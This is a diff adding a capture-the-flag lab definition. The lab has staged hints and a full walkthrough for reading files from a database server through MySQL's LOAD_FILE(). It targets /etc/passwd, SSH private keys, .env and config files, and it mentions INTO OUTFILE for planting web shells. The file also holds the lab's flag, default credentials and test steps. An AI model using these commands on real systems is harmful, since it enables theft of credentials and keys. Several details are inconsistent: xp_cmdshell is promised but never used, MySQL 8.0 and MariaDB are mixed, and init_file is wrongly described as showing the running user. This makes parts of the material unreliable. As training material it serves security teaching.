@@ -1,0 +1,489 @@
+name: MS-SQL xp_cmdshell Activation (MySQL LOAD_FILE equivalent)
+description: Test for command-execution and file-read capability on FinanceCorp's database server. The service is MySQL 8.0, so the lab uses MySQL's LOAD_FILE() as the equivalent of MS-SQL's xp_cmdshell.
+difficulty: intermediate
+category: exploitation
+duration_minutes: 120
+objectives:
+  - enable and use xp_cmdshell for command execution
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your database access testing for FinanceCorp has revealed SQL query execution 
+  capabilities. James Mitchell is particularly concerned about command execution 
+  through the database, as this could provide system-level access.
+  
+  The xp_cmdshell stored procedure allows SQL Server to execute operating system 
+  commands, which is a significant security risk if enabled. FinanceCorp needs to 
+  understand if this functionality is available and could be exploited.
+  
+  Your objective: Test for xp_cmdshell functionality on FinanceCorp's MS-SQL server. 
+  If available, enable and use it to demonstrate command execution capabilities and 
+  assess the security risk.
+
+flag: "OCR{mssql_xp_cmdsh3ll}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding File Reading Through Database Engines
+
+      One of the most dangerous capabilities of database servers is the
+      ability to interact with the underlying **operating system**. In
+      MSSQL, this is done through `xp_cmdshell`. In MySQL/MariaDB, there
+      are equivalent mechanisms that allow reading files and, in some
+      cases, executing system commands.
+
+      ### Database-to-OS Interaction Methods
+
+      | Database | Method                  | Capability                |
+      |----------|------------------------|---------------------------|
+      | MSSQL    | `xp_cmdshell`          | Execute OS commands        |
+      | MySQL    | `LOAD_FILE()`          | Read files from filesystem |
+      | MySQL    | `INTO OUTFILE`         | Write files to filesystem  |
+      | MySQL    | `sys_exec()` (UDF)     | Execute OS commands        |
+      | PostgreSQL| `COPY TO/FROM`        | Read/write files           |
+
+      ### Why This is Dangerous
+
+      When a database can read files from the filesystem:
+
+      - **Configuration files** can be exfiltrated (`/etc/passwd`,
+        `/etc/shadow`, application configs)
+      - **SSH keys** can be stolen for lateral movement
+      - **Application source code** can be read
+      - **Other credential files** can be discovered
+      - **Flag files** can be read (as in this lab)
+
+      ### MySQL's LOAD_FILE() Function
+
+      The `LOAD_FILE()` function in MySQL reads a file from the server's
+      filesystem and returns its contents as a string. This is the MySQL
+      equivalent of MSSQL's ability to read files through `xp_cmdshell`.
+
+      **Requirements for LOAD_FILE() to work:**
+      - The user must have the `FILE` privilege
+      - The file must be readable by the MySQL server process
+      - The file must be on the server (not the client)
+      - The file size must be less than `max_allowed_packet`
+
+      This lab teaches you to use this capability to read files from
+      the target system through the database connection.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Introduction to MySQL LOAD_FILE()
+
+      ### Basic Syntax
+
+      ```sql
+      SELECT LOAD_FILE('/path/to/file');
+      ```
+
+      This returns the file contents as a string, or `NULL` if the file
+      cannot be read.
+
+      ### Requirements and Privileges
+
+      To use `LOAD_FILE()`, your database user needs the **FILE** privilege.
+      Check your privileges with:
+
+      ```sql
+      SHOW GRANTS;
+      ```
+
+      Look for either:
+      - `ALL PRIVILEGES` (includes FILE)
+      - `FILE` explicitly listed
+
+      ### Common Files to Read
+
+      In a penetration test, these files are high-value targets:
+
+      ```sql
+      -- Linux system files
+      SELECT LOAD_FILE('/etc/passwd');
+      SELECT LOAD_FILE('/etc/hostname');
+      SELECT LOAD_FILE('/etc/os-release');
+
+      -- Application configuration
+      SELECT LOAD_FILE('/var/www/html/config.php');
+      SELECT LOAD_FILE('/var/www/html/.env');
+
+      -- SSH keys
+      SELECT LOAD_FILE('/root/.ssh/id_rsa');
+      SELECT LOAD_FILE('/home/user/.ssh/authorized_keys');
+
+      -- Flag files (CTF scenarios)
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      SELECT LOAD_FILE('/root/flag.txt');
+      ```
+
+      ### Handling NULL Results
+
+      If `LOAD_FILE()` returns `NULL`, possible causes include:
+
+      | Cause                        | Solution                       |
+      |------------------------------|--------------------------------|
+      | Missing FILE privilege       | Check `SHOW GRANTS`            |
+      | File does not exist          | Verify path is correct         |
+      | File not readable by MySQL   | Check file permissions         |
+      | File too large               | Check `max_allowed_packet`     |
+      | `secure_file_priv` is set    | Check variable value           |
+
+      Check the `secure_file_priv` variable:
+
+      ```sql
+      SHOW VARIABLES LIKE 'secure_file_priv';
+      ```
+
+      If this is set to a directory, `LOAD_FILE()` can only read files
+      from that directory. If empty, any file can be read.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Advanced File Reading Techniques in MySQL
+
+      ### Using LOAD_FILE() with HEX Encoding
+
+      Sometimes file contents contain special characters. Use HEX
+      encoding to handle binary files:
+
+      ```sql
+      SELECT HEX(LOAD_FILE('/tmp/flag.txt'));
+      ```
+
+      Then decode the hex string to get the original content.
+
+      ### Checking MySQL Server Configuration
+
+      Before attempting file reads, understand the server's security
+      settings:
+
+      ```sql
+      -- Check if secure_file_priv restricts file access
+      SHOW VARIABLES LIKE 'secure_file_priv';
+
+      -- Check the MySQL data directory
+      SHOW VARIABLES LIKE 'datadir';
+
+      -- Check the user MySQL is running as
+      SELECT @@global.init_file;
+
+      -- Check max file size that can be loaded
+      SHOW VARIABLES LIKE 'max_allowed_packet';
+      ```
+
+      ### MSSQL xp_cmdshell vs MySQL LOAD_FILE()
+
+      While the scenario mentions `xp_cmdshell` (an MSSQL feature), the
+      actual database in this lab is MySQL. Here is how the concepts map:
+
+      | MSSQL Concept                    | MySQL Equivalent              |
+      |----------------------------------|-------------------------------|
+      | `xp_cmdshell 'type file.txt'`    | `SELECT LOAD_FILE('file')`    |
+      | `xp_cmdshell 'dir C:\'`         | Not directly available        |
+      | `xp_cmdshell 'whoami'`           | `SELECT CURRENT_USER()`       |
+      | `xp_cmdshell 'ipconfig'`        | Not directly available        |
+
+      ### Writing Files with INTO OUTFILE
+
+      MySQL can also **write** files (if privileges allow):
+
+      ```sql
+      SELECT 'test content' INTO OUTFILE '/tmp/test.txt';
+      ```
+
+      This can be used for:
+      - Writing web shells to web-accessible directories
+      - Creating SSH authorized_keys entries
+      - Planting backdoor files
+
+      ### The Lab Objective
+
+      In this lab, you need to use `LOAD_FILE()` to read the flag from
+      `/tmp/flag.txt`. This demonstrates how database access can be
+      escalated to filesystem access.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Workflow for This Lab
+
+      ### Step 1: Install the MySQL Client
+
+      ```bash
+      sudo apt install -y default-mysql-client
+      ```
+
+      ### Step 2: Connect to the Database
+
+      Use the known credentials (`sa` / `password`):
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target>
+      ```
+
+      ### Step 3: Verify Your Privileges
+
+      Check that you have FILE privilege:
+
+      ```sql
+      SHOW GRANTS;
+      ```
+
+      Look for `ALL PRIVILEGES` or `FILE` in the output. The `sa`
+      account should have `ALL PRIVILEGES ON *.*`.
+
+      ### Step 4: Check Security Restrictions
+
+      Verify that `secure_file_priv` is not blocking file access:
+
+      ```sql
+      SHOW VARIABLES LIKE 'secure_file_priv';
+      ```
+
+      If the value is empty (`""`), you can read any file. If it
+      contains a path, you can only read files from that directory.
+
+      ### Step 5: Read System Files for Reconnaissance
+
+      Test file reading capability with a known file:
+
+      ```sql
+      SELECT LOAD_FILE('/etc/hostname');
+      ```
+
+      If this returns content, your FILE privilege is working.
+
+      ### Step 6: Read the Flag File
+
+      Now read the target flag file:
+
+      ```sql
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      ### Step 7: Demonstrate Additional File Access
+
+      For your penetration test report, show what else can be read:
+
+      ```sql
+      SELECT LOAD_FILE('/etc/passwd');
+      SELECT LOAD_FILE('/etc/os-release');
+      ```
+
+      ### Step 8: Document and Submit
+
+      Copy the flag value from the `LOAD_FILE()` output and submit
+      it to complete the lab.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands for This Lab
+
+      ### Connect to the Database
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target>
+      ```
+
+      ### Check Privileges
+
+      ```sql
+      SHOW GRANTS;
+      ```
+
+      ### Check File Access Restrictions
+
+      ```sql
+      SHOW VARIABLES LIKE 'secure_file_priv';
+      ```
+
+      ### Read the Flag File
+
+      ```sql
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      ### One-Line Solution
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      ### Additional Reconnaissance Commands
+
+      ```bash
+      # Read /etc/passwd through MySQL
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SELECT LOAD_FILE('/etc/passwd');"
+
+      # Read /etc/hostname
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SELECT LOAD_FILE('/etc/hostname');"
+
+      # Check MySQL configuration
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SHOW VARIABLES LIKE 'secure_file_priv';"
+      ```
+
+      ### Troubleshooting
+
+      If `LOAD_FILE()` returns NULL:
+
+      ```sql
+      -- Check your privileges
+      SHOW GRANTS;
+
+      -- Check secure_file_priv setting
+      SHOW VARIABLES LIKE 'secure_file_priv';
+
+      -- Verify the file exists by trying other known files
+      SELECT LOAD_FILE('/etc/hostname');
+
+      -- Try with explicit database selection
+      USE mysql;
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      If you cannot connect:
+      - Verify credentials: `sa` / `password`
+      - Check port: `nmap -p 3306 <target>`
+      - Try: `mysql --ssl-verify-server-cert=0 -u sa -p -h <target>` and enter password interactively
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Step 1: Connect to the Database
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target>
+      ```
+
+      **Expected Output:**
+      ```
+      Welcome to the MariaDB monitor.
+      Your MySQL connection id is 6
+      Server version: 10.x.x-MariaDB
+
+      MariaDB [(none)]>
+      ```
+
+      ### Step 2: Verify Privileges
+
+      ```sql
+      SHOW GRANTS;
+      ```
+
+      **Expected Output:**
+      ```
+      +-------------------------------------------+
+      | Grants for sa@%                           |
+      +-------------------------------------------+
+      | GRANT ALL PRIVILEGES ON *.* TO 'sa'@'%'   |
+      +-------------------------------------------+
+      ```
+
+      `ALL PRIVILEGES` includes the `FILE` privilege needed for
+      `LOAD_FILE()`.
+
+      ### Step 3: Check File Access Restrictions
+
+      ```sql
+      SHOW VARIABLES LIKE 'secure_file_priv';
+      ```
+
+      **Expected Output:**
+      ```
+      +------------------+-------+
+      | Variable_name    | Value |
+      +------------------+-------+
+      | secure_file_priv |       |
+      +------------------+-------+
+      ```
+
+      An empty value means no restrictions on file access.
+
+      ### Step 4: Read the Flag
+
+      ```sql
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      **Expected Output:**
+      ```
+      +------------------------------+
+      | LOAD_FILE('/tmp/flag.txt')    |
+      +------------------------------+
+      | OCR{...}                    |
+      +------------------------------+
+      ```
+
+      ### One-Line Solution
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      ### Bonus: Demonstrate Full File System Access
+
+      ```sql
+      SELECT LOAD_FILE('/etc/passwd');
+      ```
+
+      **Expected Output (partial):**
+      ```
+      root:x:0:0:root:/root:/bin/bash
+      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+      ...
+      mysql:x:999:999::/home/mysql:/bin/sh
+      ```
+
+      ### Key Takeaways
+
+      - `LOAD_FILE()` is MySQL's equivalent of reading files via
+        MSSQL's `xp_cmdshell`
+      - The `FILE` privilege (included in `ALL PRIVILEGES`) enables
+        filesystem access through the database
+      - `secure_file_priv` can restrict file access but is often empty
+      - Database compromise can escalate to filesystem access
+      - Sensitive files like `/etc/passwd`, configs, and keys can be read
+      - This demonstrates why database accounts should follow the
+        principle of least privilege
+
+      ### Remediation Recommendations
+
+      - Remove `FILE` privilege from database accounts that do not need it
+      - Set `secure_file_priv` to a specific directory or disable it
+      - Run MySQL as a non-root user with minimal filesystem permissions
+      - Use `GRANT` statements with specific privileges instead of
+        `ALL PRIVILEGES`
+      - Monitor database query logs for `LOAD_FILE()` usage
+
+      Submit the flag value to complete this lab.
+
+credentials:
+  - username: "sa"
+    password: "password"
+    role: "sa"
+    description: "sa credentials"
+
+workbook: "wiki/range/winpt/CH06_MSSQL_Exploitation/06_MSSQL_xp_cmdshell_Activation/"
+
+test:
+  steps:
+    - name: "Verify MySQL port 3306 is open"
+      command: "nmap -Pn -p 3306 {target.target} | grep '3306/tcp'"
+      expect: "open"
+
+    - name: "Authenticate and verify FILE privilege"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e 'SHOW GRANTS' 2>&1"
+      expect: "FILE"
+
+    - name: "Read flag file via LOAD_FILE"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e \"SELECT LOAD_FILE('/tmp/flag.txt')\" 2>&1"
+      expect: "OCR{"
